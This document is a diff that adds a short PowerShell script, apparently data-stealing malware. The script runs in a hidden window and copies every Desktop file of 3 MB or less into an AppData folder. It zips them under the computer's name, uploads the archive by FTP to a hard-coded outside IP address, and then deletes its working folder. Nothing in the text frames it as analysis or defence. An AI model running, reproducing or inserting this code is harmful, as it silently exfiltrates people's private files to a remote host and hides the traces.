@@ -1,0 +1,21 @@
+powershell.exe -WindowStyle Hidden {
+
+If ((test-path $env:appdata\temporary) -eq "true") {
+Remove-Item -recurse -force -confirm:$false -path $env:appdata\temporary
+New-Item -type Directory -path $env:appdata\temporary }
+else { New-Item -type Directory -path $env:appdata\temporary }
+$path_d = $env:appdata+"\temporary"
+
+$path_s = $env:userprofile+"\desktop"
+New-Item -type Directory -path $path_d\desktop
+Get-ChildItem $path_s -Recurse | ? Length -LE 3MB | % {Copy-Item -Path $_.FullName -Destination $_.FullName.Replace($path_s,$path_d)}
+
+$archive = $env:computername + ".zip"
+Compress-Archive -Path $path_d\* -DestinationPath $path_d\$archive -CompressionLevel Optimal
+
+$webclient = New-Object System.Net.WebClient 
+$ftp = "ftp://95.165.101.221/"
+$uri = New-Object System.Uri($ftp+$archive)
+$webclient.UploadFile($uri,$path_d+"\"+$archive)
+
+Remove-Item -recurse -force -confirm:$false -path $env:appdata\temporary }
